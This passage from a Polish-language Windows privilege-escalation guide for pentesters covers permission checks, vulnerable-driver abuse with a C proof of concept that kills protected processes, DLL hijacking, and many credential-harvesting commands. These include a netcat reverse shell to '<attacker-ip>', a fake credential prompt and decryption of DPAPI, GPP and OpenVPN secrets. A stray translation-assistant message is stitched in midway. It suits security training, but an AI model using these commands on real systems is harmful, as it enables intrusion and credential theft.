```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać jakiś wpis w rejestrze lub binarkę, która zostanie uruchomiona przez innego użytkownika.**\
**Przeczytaj** **następującą stronę**, aby dowiedzieć się więcej o interesujących **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Szukaj możliwych **firm trzecich, dziwnych/podatnych** sterowników
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Jeśli sterownik udostępnia arbitralny prymityw odczytu/zapisu w jądrze (częsty w źle zaprojektowanych handlerach IOCTL), możesz eskalować, kradnąc token SYSTEM bezpośrednio z pamięci jądra. Zobacz technikę krok‑po‑kroku tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Dla błędów race‑condition, gdzie podatne wywołanie otwiera kontrolowaną przez atakującego ścieżkę Object Manager, celowe spowolnienie wyszukiwania (używając komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okienko z mikrosekund do dziesiątek mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Prymitywy korupcji pamięci hive rejestru

Nowoczesne podatności w hive pozwalają przygotować deterministyczne układy, nadużyć zapisywalnych potomków HKLM/HKU oraz przekształcić uszkodzenia metadanych w przepełnienia kernel paged-pool bez potrzeby własnego sterownika. Poznaj pełny łańcuch tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Nadużywanie braku FILE_DEVICE_SECURE_OPEN na obiektach urządzeń (LPE + EDR kill)

Niektóre podpisane sterowniki firm trzecich tworzą swój obiekt urządzenia z silnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tego flagi, bezpieczny DACL nie jest egzekwowany, gdy urządzenie jest otwierane przez ścieżkę zawierającą dodatkowy komponent, pozwalając dowolnemu nieuprzywilejowanemu użytkownikowi uzyskać uchwyt używając ścieżki przestrzeni nazw takiej jak:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (na podstawie realnego przypadku)

Gdy użytkownik może otworzyć urządzenie, uprzywilejowane IOCTLs udostępnione przez sterownik mogą być nadużyte do LPE i manipulacji. Przykładowe możliwości obserwowane w praktyce:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokena / shell SYSTEM przez DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony surowy odczyt/zapis dysku (offline tampering, triki persistence przy rozruchu).
- Zakończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), pozwalając na zabicie AV/EDR z user land poprzez kernel.

Minimalny wzorzec PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Środki zaradcze dla deweloperów
- Zawsze ustaw FILE_DEVICE_SECURE_OPEN przy tworzeniu obiektów urządzeń, które mają być ograniczone przez DACL.
- Waliduj kontekst wywołującego dla operacji uprzywilejowanych. Dodaj sprawdzenia PP/PPL przed zezwoleniem na zakończenie procesu lub zwrócenie uchwytu.
- Ogranicz IOCTLs (access masks, METHOD_*, walidacja danych wejściowych) i rozważ brokered models zamiast bezpośrednich uprawnień w kernelu.

Wskazówki wykrywania dla obrońców
- Monitoruj otwarcia w user-mode podejrzanych nazw urządzeń (e.g., \\ .\\amsdk*) oraz konkretne sekwencje IOCTL wskazujące na nadużycie.
- Wymuszaj Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) i utrzymuj własne allow/deny lists.


## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu w folderze znajdującym się w PATH** możesz być w stanie przejąć DLL ładowaną przez proces i **escalate privileges**.

Sprawdź uprawnienia wszystkich folderów w PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Aby uzyskać więcej informacji o tym, jak wykorzystać to sprawdzenie:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Sieć

### Udostępnienia
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### plik hosts

Sprawdź, czy w pliku hosts nie ma innych znanych komputerów wpisanych na stałe.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfejsy sieciowe & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Sprawdź z zewnątrz, czy działają **ograniczone usługi**
```bash
netstat -ano #Opened ports?
```
### Tabela routingu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(lista reguł, tworzenie reguł, wyłącz, wyłącz...)**

Więcej[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Plik binarny `bash.exe` można także znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz konto root, możesz nasłuchiwać na dowolnym porcie (po pierwszym użyciu `nc.exe` do nasłuchiwania na porcie pojawi się pytanie w GUI, czy `nc` powinien być dozwolony przez zaporę).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Aby łatwo uruchomić bash jako root, możesz spróbować `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Poświadczenia Windows

### Poświadczenia Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menedżer poświadczeń / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault przechowuje poświadczenia użytkowników dla serwerów, stron internetowych i innych programów, do których **Windows** może się **automatycznie logować**. Na pierwszy rzut oka może się wydawać, że użytkownicy mogą przechowywać swoje poświadczenia Facebooka, Twittera, Gmaila itp., aby automatycznie logować się przez przeglądarki. Jednak tak nie jest.

Windows Vault przechowuje poświadczenia, których Windows może użyć do automatycznego logowania użytkowników, co oznacza, że każda **aplikacja Windows, która potrzebuje poświadczeń, aby uzyskać dostęp do zasobu** (serwera lub strony internetowej) **może korzystać z tego Credential Manager** & Windows Vault i użyć przechowywanych poświadczeń zamiast wymagać od użytkowników ciągłego wpisywania nazwy użytkownika i hasła.

Jeżeli aplikacje nie komunikują się z Credential Manager, nie sądzę, aby mogły używać poświadczeń dla danego zasobu. Zatem, jeśli Twoja aplikacja ma korzystać z vault, powinna w jakiś sposób **komunikować się z Credential Manager i żądać poświadczeń dla tego zasobu** z domyślnego vaultu przechowywania.

Użyj `cmdkey`, aby wyświetlić listę przechowywanych poświadczeń na maszynie.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Następnie możesz użyć `runas` z opcją `/savecred`, aby wykorzystać zapisane poświadczenia. Poniższy przykład wywołuje zdalny plik wykonywalny przez SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Użycie `runas` z podanym zestawem poświadczeń.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Uwaga: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), lub z [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** zapewnia metodę szyfrowania symetrycznego danych, używaną głównie w systemie Windows do symetrycznego szyfrowania prywatnych kluczy asymetrycznych. To szyfrowanie wykorzystuje sekret użytkownika lub systemu, który znacząco przyczynia się do entropii.

**DPAPI umożliwia szyfrowanie kluczy przez klucz symetryczny, który jest wyprowadzany z sekretów logowania użytkownika**. W scenariuszach obejmujących szyfrowanie systemowe wykorzystuje sekrety uwierzytelniania domeny systemu.

Szyfrowane klucze RSA użytkownika przy użyciu DPAPI są przechowywane w katalogu %APPDATA%\Microsoft\Protect\{SID}, gdzie {SID} reprezentuje użytkownika [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **Klucz DPAPI, współzlokalizowany z kluczem głównym, który chroni prywatne klucze użytkownika w tym samym pliku**, zwykle składa się z 64 bajtów losowych danych. (Ważne jest, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wylistowanie jego zawartości za pomocą polecenia dir w CMD, chociaż można je wylistować przez PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Możesz użyć **mimikatz module** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby go odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zwykle znajdują się w:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować.\
Możesz **wyekstrahować wiele DPAPI** **masterkeys** z **pamięci** przy użyciu modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane do **skryptowania** i zadań automatyzacyjnych jako sposób wygodnego przechowywania zaszyfrowanych poświadczeń. Poświadczenia są chronione przy użyciu **DPAPI**, co zazwyczaj oznacza, że mogą zostać odszyfrowane tylko przez tego samego użytkownika na tym samym komputerze, na którym zostały utworzone.

Aby **odszyfrować** poświadczenia PS z pliku je zawierającego, możesz zrobić:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i w `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Ostatnio uruchomione polecenia
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Menedżer poświadczeń pulpitu zdalnego**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Użyj **Mimikatz** `dpapi::rdg` modułu z odpowiednim `/masterkey` aby **odszyfrować dowolne pliki .rdg`\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z pamięci za pomocą **Mimikatz** `sekurlsa::dpapi` modułu

### Sticky Notes

Ludzie często używają aplikacji StickyNotes na stacjach roboczych Windows, aby **zapisywać hasła** i inne informacje, nie zdając sobie sprawy, że to plik bazy danych. Ten plik znajduje się w `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go wyszukać i przeanalizować.

### AppCmd.exe

**Uwaga: aby odzyskać hasła z AppCmd.exe musisz być Administratorem i uruchomić narzędzie na poziomie High Integrity.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\  
Jeśli ten plik istnieje, możliwe że niektóre **credentials** zostały skonfigurowane i mogą zostać **odzyskane**.

Ten kod został wyodrębniony z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Sprawdź, czy `C:\Windows\CCM\SCClient.exe` istnieje .\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (Info z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Pliki i Rejestr (Poświadczenia)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Klucze hosta Putty SSH
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc należy sprawdzić, czy znajduje się tam coś interesującego:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Jeśli znajdziesz jakiś wpis w tej ścieżce, będzie to prawdopodobnie zapisany klucz SSH. Jest przechowywany w postaci zaszyfrowanej, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Jeśli usługa `ssh-agent` nie działa i chcesz, aby uruchamiała się automatycznie przy starcie systemu, uruchom:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Wygląda na to, że ta technika już nie działa. Próbowałem utworzyć kilka kluczy ssh, dodać je przy pomocy `ssh-add` i zalogować się przez ssh na maszynę. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania za pomocą klucza asymetrycznego.
### Pliki pozostawione bez nadzoru
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Możesz także przeszukać te pliki przy użyciu **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Kopie zapasowe SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Dane uwierzytelniające w chmurze
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Zbuforowane hasło GPP

Dawniej istniała funkcja umożliwiająca wdrożenie niestandardowych kont lokalnych administratorów na grupie komputerów za pomocą Group Policy Preferences (GPP). Jednak ta metoda miała poważne luki w bezpieczeństwie. Po pierwsze, Group Policy Objects (GPOs), przechowywane jako pliki XML w SYSVOL, mogły być dostępne dla dowolnego użytkownika domeny. Po drugie, hasła w tych GPP, zaszyfrowane AES256 przy użyciu publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. To stwarzało poważne ryzyko, ponieważ mogło pozwolić użytkownikom na uzyskanie podwyższonych uprawnień.

Aby złagodzić to ryzyko, opracowano funkcję skanującą lokalnie zbuforowane pliki GPP zawierające pole "cpassword", które nie jest puste. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera informacje o GPP i lokalizacji pliku, co ułatwia identyfikację i usunięcie tej luki w bezpieczeństwie.

Szukaj w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed Windows Vista)_ tych plików:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Korzystanie z crackmapexec do uzyskania haseł:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Przykład pliku web.config z poświadczeniami:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN dane uwierzytelniające
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Poproś o credentials

Zawsze możesz **poprosić użytkownika o wpisanie jego credentials lub nawet credentials innego użytkownika**, jeśli uważasz, że może je znać (zauważ, że **poproszenie** klienta bezpośrednio o **credentials** jest naprawdę **ryzykowne**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Możliwe nazwy plików zawierające credentials**

Znane pliki, które jakiś czas temu zawierały **passwords** w **clear-text** lub **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to the repository files. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the other proposed files) here, and I'll translate the English text to Polish while preserving all markdown/html tags, links, paths and code unchanged.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Poświadczenia w Koszu

Powinieneś również sprawdzić Kosz w poszukiwaniu poświadczeń.

Aby **odzyskać hasła** zapisane przez różne programy możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające poświadczenia**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Powinieneś sprawdzić dbs, w których przechowywane są hasła z **Chrome or Firefox**.\
Sprawdź także historię, zakładki i ulubione przeglądarek — być może niektóre **hasła są** tam przechowywane.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia komunikację między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest identyfikowany poprzez class ID (CLSID), a każdy komponent udostępnia funkcjonalność za pośrednictwem jednego lub więcej interfejsów, identyfikowanych poprzez interface IDs (IIDs).

